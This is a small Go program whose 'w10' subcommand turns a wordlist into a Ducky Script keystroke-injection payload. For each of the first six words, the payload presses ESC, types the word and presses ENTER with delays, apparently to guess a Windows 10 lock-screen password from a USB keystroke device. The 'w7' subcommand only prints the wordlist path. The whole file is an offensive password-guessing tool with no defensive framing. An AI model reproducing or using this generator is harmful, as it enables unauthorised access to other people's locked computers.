package main

import (
"fmt"
"flag"
"os"
"bufio"
)

func main() {
   seven := flag.NewFlagSet("w7", flag.ExitOnError)
   sevenfile := seven.String("w", "", "Set Wordlist")
   
   ten := flag.NewFlagSet("w10", flag.ExitOnError)
   tenfile := ten.String("w", "", "Set Wordlist")
   
   if len(os.Args) < 2 {
      fmt.Println("Expected 'w7' and 'w10' subcommand")
      os.Exit(1)
   }
   
   switch os.Args[1] {
   
   case "w7":
      seven.Parse(os.Args[2:])
      if *sevenfile == "" {
         fmt.Println("Error: Wordlist is not set")
      } else {
         fmt.Println("file:", *sevenfile)
      }
   
   case "w10":
      ten.Parse(os.Args[2:])
      if *tenfile == "" {
         fmt.Println("Error: Wordlist is not set")
      } else {
      fmt.Println("file:", *tenfile)
      }

      file, _ := os.Open(*tenfile)
      defer file.Close()

      scanner := bufio.NewScanner(file)

      var list []string

      for scanner.Scan() {
         list = append(list, scanner.Text())
      }

      filee, _ := os.Create("output.txt")
      
      first := fmt.Sprintf("DELAY 2000\n ESC")
      filee.WriteString(first + "\n")

      for i, line := range list {
         if i<6 {
            content := fmt.Sprintf("DELAY 500\n STRING %s\n ENTER\n DELAY 500\n ENTER\n DELAY 300", line)
            filee.WriteString(content + "\n")
         }
      }
      
   default:
      fmt.Println("Expected 'w7' and 'w10' subcommand")
      os.Exit(1)
   }
}
